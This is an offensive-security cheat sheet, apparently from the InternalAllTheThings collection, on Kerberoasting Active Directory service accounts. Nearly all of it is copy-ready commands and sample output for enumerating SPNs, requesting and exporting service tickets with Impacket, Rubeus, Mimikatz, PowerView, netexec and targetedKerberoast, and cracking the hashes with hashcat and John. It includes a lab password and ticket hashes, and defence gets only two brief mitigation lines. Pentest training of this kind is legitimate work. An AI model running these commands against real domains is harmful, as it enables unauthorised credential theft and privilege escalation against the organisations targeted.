# Roasting - Kerberoasting

> "A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. " - [MSDN](https://docs.microsoft.com/fr-fr/windows/desktop/AD/service-principal-names)

Any valid domain user can request a kerberos ticket (ST) for any domain service. Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as.

## Linux

### [GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from Impacket Suite

* **List All SPN Accounts**  
  ```bash
  Impacket-GetUserSPNs -dc-ip <DC IP> <domain>/<user>
  ```
* **Request all TGS Tickets** 
  ```bash
  $ impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request

  Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

  ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           
  --------------------  -------------  --------------------------------------------------------  -------------------  -------------------
  active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40  2018-12-03 17:11:11 

  $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$424338c0a3c3af43[...]84fd2
  ```
* **Request a Single TGS ticket**  
  ```bash
  Impacket-GetUserSPNs -dc-ip <dc ip> <domain>/<user> -request-user <target user>
  ```
* **Save the ticket to an output file**  
  ```bash
  Impacket-GetUserSPNs -dc-ip <dc ip> <domain>/<user> -request-user <target user> -outputfile <filename>
  ```

 ### [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
* **for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute),**  
  **print the "kerberoast" hash, and delete the temporary SPN set for that operation**  
  ```bash
  # for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute),
  # print the "kerberoast" hash, and delete the temporary SPN set for that operation
  targetedKerberoast.py [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--request-user username] [-o OUTPUT_FILE] [--use-ldaps] [--only-abuse] [--no-abuse] [--dc-ip ip address] [-d DOMAIN] [-u USER] [-k] [--no-pass | -p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key]
  ```
## Windows

### Manual Method
* **Using setspn.exe to enumerate SPN's**  
  ```powershell
  setspn.exe -Q */*
  ```
* **Targeting a single user**  
  ```powershell
  Add-Type -AssemblyName System.IdentityModel
  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <SPN Name>
  ```
* **Retrieving All Tickets Using setspn.exe**  
  Caution: This will pull all computer accounts as well, so use with caution
  ```powershell
  setspn.exe -T <domain> -Q */* | Select-String '^CN' -Context 0,1 | % {New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
  ```
* **Extracting the tickets from Memory w/ Mimikatz**  
  ```powershell
  mimikatz # base64 /out:true # If you do not specify this, it will dump the tickets into .kirbi files
  isBase64InterceptInput  is false
  isBase64InterceptOutput is true

  mimikatz # kerberos::list /export
  ```
* **Prepare the Base64 Blob for cracking**
  ```powershell  
  echo "<base64blob>" | tr-d \\n
  ```
* **Placing the Output into a .kirbi file**  
  ```bash
  cat <encoded file> | base64 -d > <file>.kirbi
  ```
* **Ticket Extraction with kirbi2john.py**  
  ```bash
  kirbi2john.py sqldev.kirbi
  ```
* **Modify the crack_file for Hashcat**  
  ```bash
  sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
  ```
* **Crack with Hashcat**  
  ```bash
  hashcat -a 0 -m 13100 <hashfile> <wordlist>
  ```

### Automated Methods

* **netexec Module**  

  ```powershell
  $ netexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --kerberoast output.txt
  LDAP        10.0.2.11       389    dc01           [*] Windows 10.0 Build 17763 x64 (name:dc01) (domain:lab.local) (signing:True) (SMBv1:False)
  LDAP        10.0.2.11       389    dc01           $krb5tgs$23$*john.doe$lab.local$MSSQLSvc/dc01.lab.local~1433*$efea32[...]49a5e82$b28fc61[...]f800f6dcd259ea1fca8f9
  ```

* **[Rubeus](https://github.com/GhostPack/Rubeus)**  

  ```powershell
  # Stats
  Rubeus.exe kerberoast /stats
  -------------------------------------   ----------------------------------
  | Supported Encryption Type | Count |  | Password Last Set Year | Count |
  -------------------------------------  ----------------------------------
  | RC4_HMAC_DEFAULT          | 1     |  | 2021                   | 1     |
  -------------------------------------  ----------------------------------

  #All accounts with the ldap filter set to "1"
  .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #/nowrap keeps line breaks out of crackable hash

  
  # Kerberoast (RC4 ticket)
  Rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt

  # Kerberoast (AES ticket)
  # Accounts with AES enabled in msDS-SupportedEncryptionTypes will have RC4 tickets requested.
  Rubeus.exe kerberoast /tgtdeleg

  # Kerberoast (RC4 ticket)
  # The tgtdeleg trick is used, and accounts without AES enabled are enumerated and roasted.
  Rubeus.exe kerberoast /rc4opsec
  ```

* **[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)**  

  ```powershell
  # ?
  Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
  
  #List all SPN's
  Get-Domainuser * -spn | select samaccountname

  #Target a specific user
  Get-DomainUser -Identity <username> | Get-DomainSPNTicket -Format Hashcat

  #Export all tickets to a .csv
  Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
  ```

* **[bifrost](https://github.com/its-a-feature/bifrost) on macOS machine**  

  ```powershell
  ./bifrost -action asktgs -ticket doIF<...snip...>QUw= -service host/dc1-lab.lab.local -kerberoast true
  ```

* **[targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)**  

  ```powershell
  # for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), 
  # print the "kerberoast" hash, and delete the temporary SPN set for that operation
  targetedKerberoast.py [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--request-user username] [-o OUTPUT_FILE] [--use-ldaps] [--only-abuse] [--no-abuse] [--dc-ip ip address] [-d DOMAIN] [-u USER] [-k] [--no-pass | -p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key]
   ```

## Cracking w/ Hashcat
* **Crack the ticket using the correct hashcat mode (`$krb5tgs$23`= `etype 23`)**  

| Mode    | Description  |
|---------|--------------|
| `13100` | Kerberos 5 TGS-REP etype 23 (RC4) |
| `19600` | Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96) |
| `19700` | Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96) |

```powershell
./hashcat -m 13100 -a 0 kerberos_hashes.txt crackstation.txt
./john --wordlist=/opt/wordlists/rockyou.txt --fork=4 --format=krb5tgs ~/kerberos_hashes.txt
```

**Mitigations**:

* Have a very long password for your accounts with SPNs (> 32 characters)
* Make sure no users have SPNs

## References

* [Hack The Box Academy](https://academy.hackthebox.com/module/143/section/1456)
* [Abusing Kerberos: Kerberoasting - Haboob Team](https://www.exploit-db.com/docs/english/45051-abusing-kerberos---kerberoasting.pdf)
* [Invoke-Kerberoast - Powersploit Read the docs](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)
* [Kerberoasting - Part 1 - Mubix “Rob” Fuller](https://room362.com/post/2016/kerberoast-pt1/)
* [Post-OSCP Series Part 2 - Kerberoasting - 16 APRIL 2019 - Jon Hickman](https://0metasecurity.com/post-oscp-part-2/)
* [Training - Attacking and Defending Active Directory Lab - Altered Security](https://www.alteredsecurity.com/adlab)

# Original Notes from [SwisskyRepo](https://github.com/swisskyrepo/InternalAllTheThings)
